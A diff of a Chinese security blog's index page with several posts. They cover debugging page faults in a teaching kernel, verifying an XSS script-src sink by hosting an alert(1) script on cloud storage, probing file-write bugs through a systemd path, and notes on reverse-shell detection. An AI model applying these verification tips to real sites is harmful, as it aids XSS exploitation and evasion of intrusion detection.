-<p>按照理论：在第一次访问”已申请的虚拟地址”，因为”虚拟内存”和”物理内存”的映射关系还没写到”页表”中，所以”mmu硬件”在转换”虚拟地址”时会发出”缺页异常”，然后”缺页异常”处理程序会写这个映射关系到”页表”中；第二次访问同一个”已申请的虚拟地址”，因为”虚拟内存”和”物理内存”的映射关系已经写到”页表”，”mmu硬件”就可以正常转换，不会发出”缺页异常”。</p>
-<p>下面同样用gdb调试来验证一下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">(gdb) continue</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Breakpoint 1, test_vadr () at ..&#x2F;kernel&#x2F;krlvadrsmem.c:289</span><br><span class="line">289	&#123;</span><br><span class="line">(gdb) break krluserspace_accessfailed</span><br><span class="line">Breakpoint 2 at 0xffff800002026588: file ..&#x2F;kernel&#x2F;krlvadrsmem.c, line 1145.</span><br><span class="line">(gdb) x &#x2F;bx 0x40000</span><br><span class="line">0x40000:	Cannot access memory at address 0x40000</span><br><span class="line">(gdb) call vma_new_vadrs(&amp;initmmadrsdsc,0x40000,0x1000, 0, 0)   &#x2F;&#x2F; 向内核申请虚拟空间，地址是0x40000，大小是0x1000</span><br><span class="line">$1 &#x3D; 0</span><br><span class="line">(gdb) call hal_memset(0x40000,0,0x1)    &#x2F;&#x2F; 第一次访问0x40000时进入到&quot;中断处理函数&quot;</span><br><span class="line"></span><br><span class="line">Breakpoint 2, krluserspace_accessfailed (fairvadrs&#x3D;0) at ..&#x2F;kernel&#x2F;krlvadrsmem.c:1145</span><br><span class="line">...</span><br><span class="line">(gdb) finish</span><br><span class="line">Run till exit from #0  krluserspace_accessfailed (fairvadrs&#x3D;2097282) at ..&#x2F;kernel&#x2F;krlvadrsmem.c:1145</span><br><span class="line">...</span><br><span class="line">(gdb) finish</span><br><span class="line">Run till exit from #0  0xffff8000020135d2 in hal_fault_allocator (faultnumb&#x3D;14,</span><br><span class="line">    krnlsframp&#x3D;0xffff80000008fe18) at ..&#x2F;hal&#x2F;x86&#x2F;halintupt.c:171</span><br><span class="line">0xffff80000200d830 in exc_page_fault ()</span><br><span class="line">(gdb) finish</span><br><span class="line">Run till exit from #0  0xffff80000200d830 in exc_page_fault ()</span><br><span class="line">(gdb) where</span><br><span class="line">#0  test_vadr () at ..&#x2F;kernel&#x2F;krlvadrsmem.c:289</span><br><span class="line">...</span><br><span class="line">(gdb) call hal_memset(0x40000,0,0x1)    &#x2F;&#x2F; 第二次访问0x40000时没有产生&quot;中断&quot;</span><br><span class="line">(gdb) x &#x2F;bx 0x40000</span><br><span class="line">0x40000:	0x00</span><br></pre></td></tr></table></figure>
-
-<p>从上面可以看到：调用<code>vma_new_vadrs</code>申请<code>0x40000</code>地址后，第一次调用<code>hal_memset</code>去访问<code>0x40000</code>时会进入到”缺页异常”处理程序(<code>krluserspace_accessfailed</code>函数)中，第二次再访问<code>0x40000</code>时就不会进入到”缺页异常”处理程序。</p>
-</li>
-</ul>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过调试，很容易对cosmos中”虚拟内存”访问时的业务流程做一点研究。</p>
-<p>同样我们可以通过”调试”去观察”分页”机制，来验证课程中的知识点。</p>
-<p>PS：后面会有一篇文章讲解怎么调试cosmos代码</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E9%AA%8C%E8%AF%81%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%B0%8F%E6%8A%80%E5%B7%A7/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -502,6 +680,106 @@
 <li>可以用 /run/systemd/ask-password-block/136:{id} 文件来探测是否存在文件写漏洞，前提是服务有root权限。</li>
 </ul>
 <p>最后，感谢和我讨论这个小问题的朋友。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E9%AA%8C%E8%AF%81%E7%BC%BA%E9%A1%B5%E4%B8%AD%E6%96%AD%E6%9C%BA%E5%88%B6/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021-12-26-%E9%AA%8C%E8%AF%81%E7%BC%BA%E9%A1%B5%E4%B8%AD%E6%96%AD%E6%9C%BA%E5%88%B6/" class="post-title-link" itemprop="url">验证缺页中断机制</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>在x86系列的cpu上开启分页机制后，指令涉及到”内存读写”操作时，用到的”内存地址”都是”虚拟地址”。”mmu硬件”会按照”分段”、”分页”的计算规则，将”虚拟地址”转换成”物理地址”。最终指令可以对”物理地址”读写数据。</p>
+<p>上面这段关于内存的”理论知识”，我觉得如果可以实践看一看，就能多一些”感觉”。</p>
+<p>本文记录我对下面两个结论的调试和验证过程，也是我对极客时间的<a target="_blank" rel="noopener" href="https://time.geekbang.org/column/intro/100078401?tab=catalog">操作系统实战 45 讲</a>课程中”内存管理”章节的部分学习和实践，基于<a target="_blank" rel="noopener" href="https://gitee.com/lmos/cosmos/tree/master/lesson25~26/Cosmos">第26课代码</a>。</p>
+<p>“mmu硬件”在转换”虚拟地址”时有可能发生”缺页异常”，包括：</p>
+<ul>
+<li>访问”未向内核申请的虚拟地址”会导致”缺页异常”</li>
+<li>当第一次访问申请的虚拟地址时，也会产生”缺页异常”；第二次访问同样的虚拟地址时，不会产生”缺页异常”</li>
+</ul>
+<h1 id="验证过程"><a href="#验证过程" class="headerlink" title="验证过程"></a>验证过程</h1><ul>
+<li><p>访问”未向内核申请的虚拟地址”会导致”缺页异常”</p>
+<p>按照理论来说：访问未申请的虚拟地址时，”mmu硬件”在转换”虚拟地址”时会发出”缺页异常”（可能因为找不到对应的”页表项”）</p>
+<p>在验证这个理论前，先介绍一下cosmos(课程自制的内核系统名称)相关的代码，以方便读者大概理解文中出现的函数作用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">void test_vadr()</span><br><span class="line">&#123;</span><br><span class="line">	adr_t vadr &#x3D; vma_new_vadrs(&amp;initmmadrsdsc, NULL, 0x1000, 0, 0);  &#x2F;&#x2F; 0x1000是想要申请的空间大小，vadr是申请的内存地址</span><br><span class="line">	if(NULL &#x3D;&#x3D; vadr)</span><br><span class="line">	&#123;</span><br><span class="line">		kprint(&quot;分配虚拟地址空间失败\n&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">  ...</span><br><span class="line">	hal_memset((void*)vadr, 0, 0x1000);  &#x2F;&#x2F; 初始化刚申请的内存为0</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>上面<code>test_vadr</code>是cosmos中用来验证”虚拟内存”相关功能的测试函数。</p>
+<p>在cosmos中，想要使用虚拟空间，需要先调用<code>vma_new_vadrs</code>申请一个虚拟地址。</p>
+<p>cosmos相关代码介绍完毕，下面用gdb调试课程代码，来实际验证一下”理论”：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">(gdb) break test_vadr   &#x2F;&#x2F; 在 test_vadr 函数下断点（选择在test_vadr函数下断点，是因为此时 虚拟内存管理、物理内存管理、缺页异常处理 等功能都已经实现）</span><br><span class="line">Breakpoint 1 at 0xffff80000202444a: file ..&#x2F;kernel&#x2F;krlvadrsmem.c, line 289.</span><br><span class="line">(gdb) continue</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Breakpoint 1, test_vadr () at ..&#x2F;kernel&#x2F;krlvadrsmem.c:289</span><br><span class="line">289	&#123;</span><br><span class="line">(gdb) break krluserspace_accessfailed   &#x2F;&#x2F; 在 krluserspace_accessfailed 函数下断点</span><br><span class="line">Breakpoint 2 at 0xffff800002026588: file ..&#x2F;kernel&#x2F;krlvadrsmem.c, line 1145.</span><br><span class="line">(gdb) call hal_memset(0x400,0,0x1)  &#x2F;&#x2F; 调用hal_memset函数，向 0x400地址 写一个字节内容</span><br><span class="line"></span><br><span class="line">Breakpoint 2, krluserspace_accessfailed (fairvadrs&#x3D;0) at ..&#x2F;kernel&#x2F;krlvadrsmem.c:1145 &#x2F;&#x2F;</span><br><span class="line">...</span><br><span class="line">(gdb) where   &#x2F;&#x2F; 可以看到 当前代码在..&#x2F;kernel&#x2F;krlvadrsmem.c文件1145行的krluserspace_accessfailed</span><br><span class="line">#0  krluserspace_accessfailed (fairvadrs&#x3D;0) at ..&#x2F;kernel&#x2F;krlvadrsmem.c:1145</span><br><span class="line">#1  0xffff8000020135d2 in hal_fault_allocator (faultnumb&#x3D;14, krnlsframp&#x3D;0xffff80000008fe18)</span><br><span class="line">    at ..&#x2F;hal&#x2F;x86&#x2F;halintupt.c:171</span><br><span class="line">#2  0xffff80000200d830 in exc_page_fault ()</span><br><span class="line">...</span><br><span class="line">(gdb) continue</span><br><span class="line">Continuing.</span><br><span class="line">^C      &#x2F;&#x2F; 因为在这里卡死了，所以我按了ctrl+c</span><br><span class="line">Program received signal SIGINT, Interrupt.</span><br><span class="line">hal_sysdie (errmsg&#x3D;0xffff80000203a237 &quot;缺页处理失败\n&quot;) at ..&#x2F;hal&#x2F;x86&#x2F;halcpuctrl.c:185</span><br><span class="line">185	        ;</span><br></pre></td></tr></table></figure>
+<p>从上面的调试信息可以看出来：cpu在执行<code>hal_memset</code>函数访问<code>0x400</code>虚拟地址时，跳到了<code>krluserspace_accessfailed</code>函数，最后卡死在<code>halcpuctrl.c</code>第185行</p>
+<p><img src="https://user-images.githubusercontent.com/1846319/144075113-24fdf0f1-74ac-4223-9a09-d6c71ed0993a.png" alt="image"></p>
+<p>这里的<code>0x400</code>地址不是通过<code>vma_new_vadrs</code>申请的地址。</p>
+<p><code>krluserspace_accessfailed</code>函数只有cpu遇到中断并且中断号为14（也就是”缺页异常”）的时候才会被调用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 异常处理</span><br><span class="line">void hal_fault_allocator(uint_t faultnumb, void *krnlsframp) &#x2F;&#x2F;eax,edx</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    if (faultnumb &#x3D;&#x3D; 14)        &#x2F;&#x2F; 缺页异常 中断号是14</span><br><span class="line">    &#123;</span><br><span class="line">        ...</span><br><span class="line">        if (krluserspace_accessfailed(fairvadrs) !&#x3D; 0)</span><br><span class="line">       &#123;</span><br><span class="line">           system_error(&quot;缺页处理失败\n&quot;);</span><br><span class="line">       &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以可以推测出来：访问<code>0x400</code>时，mmu硬件发出了”缺页中断”，接着cpu处理”缺页中断”就会到<code>krluserspace_accessfailed</code>函数，因为<code>krluserspace_accessfailed</code>函数处理”页表映射”失败，所以会调用<code>system_error</code>函数，最终执行<code>for循环</code>卡死。</p>
+<p>这样可以看出来理论没有问题。</p>
+</li>
+<li><p>访问”已申请的虚拟地址”</p>
+<p>按照理论：在第一次访问”已申请的虚拟地址”，因为”虚拟内存”和”物理内存”的映射关系还没写到”页表”中，所以”mmu硬件”在转换”虚拟地址”时会发出”缺页异常”，然后”缺页异常”处理程序会写这个映射关系到”页表”中；第二次访问同一个”已申请的虚拟地址”，因为”虚拟内存”和”物理内存”的映射关系已经写到”页表”，”mmu硬件”就可以正常转换，不会发出”缺页异常”。</p>
+<p>下面同样用gdb调试来验证一下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">(gdb) continue</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Breakpoint 1, test_vadr () at ..&#x2F;kernel&#x2F;krlvadrsmem.c:289</span><br><span class="line">289	&#123;</span><br><span class="line">(gdb) break krluserspace_accessfailed</span><br><span class="line">Breakpoint 2 at 0xffff800002026588: file ..&#x2F;kernel&#x2F;krlvadrsmem.c, line 1145.</span><br><span class="line">(gdb) x &#x2F;bx 0x40000</span><br><span class="line">0x40000:	Cannot access memory at address 0x40000</span><br><span class="line">(gdb) call vma_new_vadrs(&amp;initmmadrsdsc,0x40000,0x1000, 0, 0)   &#x2F;&#x2F; 向内核申请虚拟空间，地址是0x40000，大小是0x1000</span><br><span class="line">$1 &#x3D; 0</span><br><span class="line">(gdb) call hal_memset(0x40000,0,0x1)    &#x2F;&#x2F; 第一次访问0x40000时进入到&quot;中断处理函数&quot;</span><br><span class="line"></span><br><span class="line">Breakpoint 2, krluserspace_accessfailed (fairvadrs&#x3D;0) at ..&#x2F;kernel&#x2F;krlvadrsmem.c:1145</span><br><span class="line">...</span><br><span class="line">(gdb) finish</span><br><span class="line">Run till exit from #0  krluserspace_accessfailed (fairvadrs&#x3D;2097282) at ..&#x2F;kernel&#x2F;krlvadrsmem.c:1145</span><br><span class="line">...</span><br><span class="line">(gdb) finish</span><br><span class="line">Run till exit from #0  0xffff8000020135d2 in hal_fault_allocator (faultnumb&#x3D;14,</span><br><span class="line">    krnlsframp&#x3D;0xffff80000008fe18) at ..&#x2F;hal&#x2F;x86&#x2F;halintupt.c:171</span><br><span class="line">0xffff80000200d830 in exc_page_fault ()</span><br><span class="line">(gdb) finish</span><br><span class="line">Run till exit from #0  0xffff80000200d830 in exc_page_fault ()</span><br><span class="line">(gdb) where</span><br><span class="line">#0  test_vadr () at ..&#x2F;kernel&#x2F;krlvadrsmem.c:289</span><br><span class="line">...</span><br><span class="line">(gdb) call hal_memset(0x40000,0,0x1)    &#x2F;&#x2F; 第二次访问0x40000时没有产生&quot;中断&quot;</span><br><span class="line">(gdb) x &#x2F;bx 0x40000</span><br><span class="line">0x40000:	0x00</span><br></pre></td></tr></table></figure>
+
+<p>从上面可以看到：调用<code>vma_new_vadrs</code>申请<code>0x40000</code>地址后，第一次调用<code>hal_memset</code>去访问<code>0x40000</code>时会进入到”缺页异常”处理程序(<code>krluserspace_accessfailed</code>函数)中，第二次再访问<code>0x40000</code>时就不会进入到”缺页异常”处理程序。</p>
+</li>
+</ul>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过调试，很容易对cosmos中”虚拟内存”访问时的业务流程做一点研究。</p>
+<p>同样我们可以通过”调试”去观察”分页”机制，来验证课程中的知识点。</p>
+<p>PS：后面会有一篇文章讲解怎么调试cosmos代码</p>
 
       
     </div>
@@ -780,6 +1058,100 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E6%8F%90%E9%AB%98%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E6%95%88%E7%8E%87%E7%9A%84%E5%B7%A5%E5%85%B7/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021-12-26-%E6%8F%90%E9%AB%98%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E6%95%88%E7%8E%87%E7%9A%84%E5%B7%A5%E5%85%B7/" class="post-title-link" itemprop="url">提高漏洞验证效率的工具</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>某个xss漏洞点如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">x&#x3D;document.createElement(&quot;script&quot;);</span><br><span class="line">x.setAttribute(&quot;src&quot;, &quot;用户可控的地址&quot;);</span><br><span class="line">document.body.appendChild(x);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>虽然xss漏洞肯定是存在的，但是我不知道利用起来是不是会有问题，比如碰到csp等。</p>
+<p>所以我在”用户可控地址” 填入 “<a target="_blank" rel="noopener" href="http://x.x.x.x/1.js&quot;">http://x.x.x.x/1.js&quot;</a> 来验证，于是出现了点问题。</p>
+<p>第一个问题：https站点引入http静态资源时，浏览器控制台出现”混合内容”警告。似乎会影响js解析</p>
+<p>第二个问题：响应头的content-type需要是text/javascript，否则不能当作js解析</p>
+<p>所以我需要一个web服务：</p>
+<ul>
+<li>支持https</li>
+<li>返回内容可以自定义</li>
+<li>响应头content-type可以自定义</li>
+<li>支持公网访问</li>
+</ul>
+<p>自己去搭这样一个服务也不难，但是如果有现成的岂不是更好，省时省力。</p>
+<p>根据历史经验，我知道有两种平台似乎可以解决我的这个小需求：</p>
+<ul>
+<li>类似 pastebin 的平台，可以通过短链接访问</li>
+<li>xss平台</li>
+</ul>
+<h1 id="测试这些平台是否好用"><a href="#测试这些平台是否好用" class="headerlink" title="测试这些平台是否好用"></a>测试这些平台是否好用</h1><p><a target="_blank" rel="noopener" href="http://ix.io/">http://ix.io</a> : 不支持https</p>
+<p><a target="_blank" rel="noopener" href="http://pastebin.com/">http://pastebin.com</a>: 不支持设置content-type</p>
+<p>搜索到的很多xss平台，都需要邀请码。甚至有的注册成功了，但是使用起来有问题。</p>
+<p>再比如 xssye.com 这个xss平台我很久以前用过。今天登陆提示账号密码登陆不上，申请密码找回提示邮箱和账号对不上，重新注册又提示”需要注册邀请码”。</p>
+<p>总之试了几个，感觉用着比较难受。这些xss平台看前段页面似乎都是一套代码，也不确定是否可能存在漏洞。</p>
+<h1 id="有没有稳定好用的服务"><a href="#有没有稳定好用的服务" class="headerlink" title="有没有稳定好用的服务"></a>有没有稳定好用的服务</h1><p>想起来云上的文件存储服务，刚好是满足我自己的需求的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ curl https:&#x2F;&#x2F;webbackup-3knjfg4bxz.bj.bcebos.com&#x2F;1.js</span><br><span class="line">alert(1);</span><br></pre></td></tr></table></figure>
+
+<p>另外云上的函数服务，还可以写代码对响应做更精细的控制。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>云上的 文件存储、函数服务 等很适合快速在公网提供https服务，而且相对于个人自己搭建的服务要稳定省心得多，推荐使用。</p>
+<p>当然云上也有很坑的服务，就不说了。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E6%9F%90%E5%8E%82%E5%95%86%E7%9A%84%E5%8F%8D%E5%BC%B9shell%E9%98%B2%E6%8A%A4%E8%83%BD%E5%8A%9B%E6%B5%8B%E8%AF%95/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -859,100 +1231,6 @@
 <li>检测到反弹shell后不会立马告警：厂商会检测shell是否执行命令，如果仅仅反弹shell但是没有执行命令就不会被拦截</li>
 </ul>
 <h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">Reverse Shell Cheat Sheet</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/263684.html">云上威胁检测 | 详解反弹shell多维检测技术</a></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E6%8F%90%E9%AB%98%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E6%95%88%E7%8E%87%E7%9A%84%E5%B7%A5%E5%85%B7/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="leveryd">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="leveryd的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-%E6%8F%90%E9%AB%98%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E6%95%88%E7%8E%87%E7%9A%84%E5%B7%A5%E5%85%B7/" class="post-title-link" itemprop="url">提高漏洞验证效率的工具</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>某个xss漏洞点如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">x&#x3D;document.createElement(&quot;script&quot;);</span><br><span class="line">x.setAttribute(&quot;src&quot;, &quot;用户可控的地址&quot;);</span><br><span class="line">document.body.appendChild(x);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>虽然xss漏洞肯定是存在的，但是我不知道利用起来是不是会有问题，比如碰到csp等。</p>
-<p>所以我在”用户可控地址” 填入 “<a target="_blank" rel="noopener" href="http://x.x.x.x/1.js&quot;">http://x.x.x.x/1.js&quot;</a> 来验证，于是出现了点问题。</p>
-<p>第一个问题：https站点引入http静态资源时，浏览器控制台出现”混合内容”警告。似乎会影响js解析</p>
-<p>第二个问题：响应头的content-type需要是text/javascript，否则不能当作js解析</p>
-<p>所以我需要一个web服务：</p>
-<ul>
-<li>支持https</li>
-<li>返回内容可以自定义</li>
-<li>响应头content-type可以自定义</li>
-<li>支持公网访问</li>
-</ul>
-<p>自己去搭这样一个服务也不难，但是如果有现成的岂不是更好，省时省力。</p>
-<p>根据历史经验，我知道有两种平台似乎可以解决我的这个小需求：</p>
-<ul>
-<li>类似 pastebin 的平台，可以通过短链接访问</li>
-<li>xss平台</li>
-</ul>
-<h1 id="测试这些平台是否好用"><a href="#测试这些平台是否好用" class="headerlink" title="测试这些平台是否好用"></a>测试这些平台是否好用</h1><p><a target="_blank" rel="noopener" href="http://ix.io/">http://ix.io</a> : 不支持https</p>
-<p><a target="_blank" rel="noopener" href="http://pastebin.com/">http://pastebin.com</a>: 不支持设置content-type</p>
-<p>搜索到的很多xss平台，都需要邀请码。甚至有的注册成功了，但是使用起来有问题。</p>
-<p>再比如 xssye.com 这个xss平台我很久以前用过。今天登陆提示账号密码登陆不上，申请密码找回提示邮箱和账号对不上，重新注册又提示”需要注册邀请码”。</p>
-<p>总之试了几个，感觉用着比较难受。这些xss平台看前段页面似乎都是一套代码，也不确定是否可能存在漏洞。</p>
-<h1 id="有没有稳定好用的服务"><a href="#有没有稳定好用的服务" class="headerlink" title="有没有稳定好用的服务"></a>有没有稳定好用的服务</h1><p>想起来云上的文件存储服务，刚好是满足我自己的需求的。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ curl https:&#x2F;&#x2F;webbackup-3knjfg4bxz.bj.bcebos.com&#x2F;1.js</span><br><span class="line">alert(1);</span><br></pre></td></tr></table></figure>
-
-<p>另外云上的函数服务，还可以写代码对响应做更精细的控制。</p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>云上的 文件存储、函数服务 等很适合快速在公网提供https服务，而且相对于个人自己搭建的服务要稳定省心得多，推荐使用。</p>
-<p>当然云上也有很坑的服务，就不说了。</p>
 
       
     </div>
@@ -1089,187 +1367,6 @@ Nginx提供 `lua_regex_match_limit` 指令限制回溯次数</code></pre>
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E7%BB%86%E5%93%81%E6%9F%90%E8%AF%AD%E4%B9%89waf%E7%9A%84xss%E9%98%B2%E6%8A%A4(1)/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="leveryd">
-      <meta itemprop="description" content="">
-    </span>
-
